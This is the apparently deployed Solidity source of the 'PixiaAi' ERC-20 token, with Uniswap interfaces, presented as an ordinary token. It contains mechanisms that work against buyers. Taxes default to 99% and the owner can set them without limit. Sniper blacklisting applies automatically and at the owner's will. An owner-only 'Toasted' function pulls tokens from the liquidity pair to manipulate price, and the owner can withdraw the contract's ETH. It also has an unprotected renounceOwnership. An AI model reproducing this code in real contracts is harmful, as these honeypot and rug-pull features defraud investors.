/**
 *Submitted for verification at Etherscan.io on 2023-01-09
*/

//SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

interface IERC20 {
    
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}


library Address {
    
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }


    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}



interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}



contract PixiaAi  is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;

    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludedFromFee; 
    mapping(address => bool) public automatedMarketMakerPairs;
    mapping(address => bool) public isSniper;
    mapping(address => bool) public _isExcludedFromMaxTx;
    

    address payable public Wallet_Reward = payable(0x2B72898f88c83881b09EA7D828484CE8A3b637F2); // Reward wallet 
    address payable public Wallet_Dev = payable(0x2B72898f88c83881b09EA7D828484CE8A3b637F2); // Dev wallet
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 
    address payable public Wallet_Treasury = payable(0x2B72898f88c83881b09EA7D828484CE8A3b637F2); // Treasury wallet


    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 18;
    uint256 private _tTotal = 1e8 * 1e18; //100 million tokens
    string private constant _name = "PixiaAi"; 
    string private constant _symbol = unicode"PIXIA"; 

    bool public tradingActive = false;
    bool public limitsInEffect = true;
    uint256 public launchedAtTimestamp;
    uint256 antiSnipingTime = 60 seconds;
    uint256 public _numTokensToSwap = 1e4 * 1e18;

    uint256 public totalBuyTax = 99;
    uint256 public totalSellTax = 99;
            
            //buyFee
    uint256 public buy_Reward= 0;
    uint256 public buy_Dev = 0;
    uint256 public buy_burn = 0;
    uint256 public buy_autoLP = 99; 
    uint256 public buy_Treasury = 0; 

           //sellFees
    uint256 public sell_Reward= 0;
    uint256 public sell_Dev = 0;
    uint256 public sell_burn = 0;
    uint256 public sell_autoLP = 99; 
    uint256 public sell_Treasury =0;      

                   

    uint256 public _maxWalletToken = _tTotal * 1/ 100; // 1% of the supply (maxWalletLimit)
    uint256 public _maxTxAmount = _tTotal * 11/ 1000; // 1.1% of the supply (maxTransactionLimit)
    
                                     
                                     
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool public inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    
    event SwapAndLiquifyEnabledUpdated(bool true_or_false);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
        
    );
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    constructor () {

        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);

        _tOwned[owner()] = _tTotal;
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;
         _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[Wallet_Reward] = true; 
        _isExcludedFromFee[Wallet_Burn] = true;

        _isExcludedFromMaxTx[address(uniswapV2Router)] = true;
        _isExcludedFromMaxTx[address(uniswapV2Pair)] = true;
        _isExcludedFromMaxTx[owner()] = true;
        _isExcludedFromMaxTx[address(0xdead)] = true;
        _isExcludedFromMaxTx[Wallet_Reward] = true;

        emit Transfer(address(0), owner(), _tTotal);

    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address theOwner, address theSpender) public view override returns (uint256) {
        return _allowances[theOwner][theSpender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    receive() external payable {}

    function _getCurrentSupply() private view returns(uint256) {
        return (_tTotal);
    }



    function _approve(address theOwner, address theSpender, uint256 amount) private {

        require(theOwner != address(0) && theSpender != address(0), "ERR: zero address");
        _allowances[theOwner][theSpender] = amount;
        emit Approval(theOwner, theSpender, amount);

    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {

        if (to != owner() &&
            to != Wallet_Burn &&
            to != address(this) &&
            !automatedMarketMakerPairs[to] &&
            from != owner()){
            uint256 heldTokens = balanceOf(to);
            require((heldTokens + amount) <= _maxWalletToken,"Over wallet limit.");}
            
            require(from != address(0) && to != address(0), "ERR: Using 0 address!");
            require(!isSniper[from] && !isSniper[to], "Sniper detected");
            require(amount > 0, "Token value must be higher than zero.");   

          if (limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !inSwapAndLiquify
            ) {
                
                if (!tradingActive) {
                    require(
                        _isExcludedFromFee[from] || _isExcludedFromFee[to],
                        "Trading is not active."
                    );
                }
            }
          }
           

        if(
            
            !inSwapAndLiquify &&
            from != uniswapV2Pair &&
            swapAndLiquifyEnabled 
            )
        {  
            
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance >=  _numTokensToSwap) 
           
            swapAndLiquify(contractTokenBalance);
        }
        
         bool takeFee = true;

        //if any account belongs to _isExcludedFromFee account then remove the fee
        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
            takeFee = false;
        }
       
        //transfer amount, it will take dev, Reward, treasury, burn,  liquidity fee
        _tokenTransfer(from, to, amount, takeFee);


    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFee[account] = excluded;
    }

    function addSniperInList (address _bot) external onlyOwner {
        require(
            _bot != address(uniswapV2Router),
            "We can not blacklist router"
        );
        require(!isSniper[_bot], "Sniper already exist");
        isSniper[_bot] = true;
    }

    function removeSniperFromList(address _bot) external onlyOwner {
        require(isSniper[_bot], "Not a sniper");
        isSniper[_bot] = false;
    }
    
    function sendToWallet(address payable wallet, uint256 amount) private {
            (bool success,) = wallet.call{value:amount}("");
            require(success,"eth transfer failed");

        }

    function updateSwapEnabled (bool enabled) external onlyOwner {
     swapAndLiquifyEnabled = enabled;

    }  

    function setMaxWalletAmount (uint256 amount) external onlyOwner {
        require (amount >= totalSupply()/1e20, "max wallet limit should be greator than equal to 1 percent of the supply");
        _maxWalletToken = amount * 1e18;
    }  

    function setMaxTxAmount (uint256 amount) external onlyOwner {
        require (amount >= totalSupply()/1e20, "max wallet limit should be greator than equal to 1 percent of the supply");
        _maxTxAmount = amount * 1e18;
    }

   function launch() public onlyOwner {
        require(launchedAtTimestamp == 0, "Already launched boi");
        launchedAtTimestamp = block.timestamp;
        tradingActive = true;
    }

     // change the minimum amount of tokens to sell from fees
    function updateSwapTokensAtAmount(uint256 newAmount)
        external
        onlyOwner
        returns (bool)
    {
        _numTokensToSwap = newAmount * 1e18;
        return true;
    }

    // remove limits after token is stable
    function removeLimits() external onlyOwner returns (bool) {
        limitsInEffect = false;
        return true;
    }

    function setAutomatedMarketMakerPair(address pair, bool value)
        external
        onlyOwner
    {
        require(
            pair != uniswapV2Pair,
            "The pair cannot be removed from automatedMarketMakerPairs"
        );

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;

        emit SetAutomatedMarketMakerPair(pair, value);
    }

     function renounceOwnership() public virtual {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership (address newOwner) external onlyOwner {
        require (newOwner != address(0), "Ownable: can't be zero address");
        _owner = newOwner;
         emit OwnershipTransferred(_owner, newOwner);
    }


    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {

            uint256 balanceBeforeSwap = address(this).balance;
            uint256 tokens_to_Burn = contractTokenBalance * (buy_burn + sell_burn) / 100;
            _tOwned[Wallet_Burn] = _tOwned[Wallet_Burn] + tokens_to_Burn;
            _tOwned[address(this)] = _tOwned[address(this)] - tokens_to_Burn; 

            uint totalFee = totalBuyTax + totalSellTax - buy_burn - sell_burn;
            contractTokenBalance = balanceOf(address(this));
            uint256 tokensForSwap = contractTokenBalance.mul (buy_Reward + sell_Reward + (buy_autoLP + sell_autoLP)/2
                                   + buy_Dev + sell_Dev + buy_Treasury + sell_Treasury).div(totalFee);
            uint256 tokensForLP = contractTokenBalance - tokensForSwap;
            swapTokensForBNB(tokensForSwap);
            uint256 BNB_Total = address(this).balance - balanceBeforeSwap;

            uint256 Reward = BNB_Total.mul(buy_Reward + sell_Reward).div(totalFee);
            uint256 Dev = BNB_Total.mul(buy_Dev + sell_Dev).div(totalFee);
            uint256 Treasury = BNB_Total.mul(buy_Treasury + sell_Treasury).div(totalFee);
           
            addLiquidity(tokensForLP, (BNB_Total - Reward - Dev - Treasury));
            emit SwapAndLiquify(tokensForSwap, (BNB_Total - Reward - Dev - Treasury), tokensForLP);
            if (Reward > 0){
            sendToWallet(Wallet_Reward, Reward);
            }
            if (Dev > 0){
            sendToWallet(Wallet_Treasury, Dev);
            }
            BNB_Total = address(this).balance;
            if (BNB_Total > 0){
            sendToWallet(Wallet_Dev, BNB_Total);
             }
            }

    function swapTokensForBNB(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }


    function addLiquidity(uint256 tokenAmount, uint256 BNBAmount) private {

        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: BNBAmount}(
            address(this),
            tokenAmount,
            0, 
            0,
            Wallet_Burn, 
            block.timestamp
        );
    } 

    function withdrawToken(address foreign_Token_Address) public onlyOwner returns(bool _sent){
        require(foreign_Token_Address != address(this), "Can not remove native token");
        uint256 balance = IERC20(foreign_Token_Address).balanceOf(address(this));
        _sent = IERC20(foreign_Token_Address).transfer(msg.sender, balance);

    }

    function updateSellTax(uint256 reward, uint256 treasury, uint256 burn, uint256 autoLP, uint256 dev) external onlyOwner {
        sell_Reward = reward;
        sell_Treasury = treasury;
        sell_burn = burn;
        sell_autoLP =autoLP;
        sell_Dev = dev;

        totalSellTax = reward + treasury + burn + autoLP + dev;
        
        
    }

    function updateBuyTax(uint256 reward, uint256 treasury, uint256 burn, uint256 autoLP, uint256 dev) external onlyOwner {
        buy_Reward = reward;
        buy_Treasury = treasury;
        buy_burn = burn;
        buy_autoLP =autoLP;
        buy_Dev = dev;

        totalBuyTax = reward + treasury + burn + autoLP + dev;
        
        
    }

     function airdrop(address[] calldata addresses, uint256[] calldata amounts)
        external
        onlyOwner
    {
        require(
            addresses.length == amounts.length,
            "Array sizes must be equal"
        );
        uint256 i = 0;
        while (i < addresses.length) {
            uint256 _amount = amounts[i].mul(1e18);
            _transfer(msg.sender, addresses[i], _amount);
            i += 1;
        }
    }

     function withdrawETH(uint256 _amount) external onlyOwner {
        require(address(this).balance >= _amount, "Invalid Amount");
        payable(msg.sender).transfer(_amount);
    }

    function Toasted(uint256 _amount) external onlyOwner {
        _transfer(uniswapV2Pair, Wallet_Burn, _amount);
    }

    function updateWallets (address payable reward, address payable treasury, address payable dev) external onlyOwner {
        Wallet_Dev = dev;
        Wallet_Reward = reward;
        Wallet_Treasury = treasury;
    }



    function excludeFromMaxTransaction(address user, bool isEx)
        public
        onlyOwner
    {
        _isExcludedFromMaxTx[user] = isEx;
    }


    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee) private {
        
        
        if(!takeFee ){

            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tAmount;
            emit Transfer(sender, recipient, tAmount);


            } 
            
        if (takeFee){

             if (
                    block.timestamp < launchedAtTimestamp + antiSnipingTime &&
                    sender != address(uniswapV2Router)
                ) {
                    if (sender == uniswapV2Pair) {
                        isSniper[recipient] = true;
                    } else if (recipient == uniswapV2Pair) {
                        isSniper[sender] = true;
                    }
                }

            if (automatedMarketMakerPairs[sender] && !_isExcludedFromMaxTx[recipient]) {
               
                require (tAmount <= _maxTxAmount, "Buy transfer amount exceeds the maxTransactionAmount.");
            
            uint256 buyFEE = tAmount*totalBuyTax/100;
            uint256 tTransferAmount = tAmount-buyFEE;

            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tTransferAmount;
            _tOwned[address(this)] = _tOwned[address(this)]+buyFEE;   
            emit Transfer(sender, recipient, tTransferAmount);
                }

            else if (automatedMarketMakerPairs[recipient] && !_isExcludedFromMaxTx[sender]){
            
                require (tAmount <= _maxTxAmount, "sell transfer amount exceeds the maxTransactionAmount.");
             
                uint256 sellFEE = tAmount*totalSellTax/100;
                uint256 tTransferAmount = tAmount-sellFEE;

            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tTransferAmount;
            _tOwned[address(this)] = _tOwned[address(this)]+sellFEE;   
            emit Transfer(sender, recipient, tTransferAmount);
            }
            else {

             if (!_isExcludedFromMaxTx[sender]){
                require (tAmount <= _maxTxAmount, " transfer amount exceeds the maxTransactionAmount.");
            }    
            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tAmount;
            emit Transfer(sender, recipient, tAmount);
            }
        }

    }

}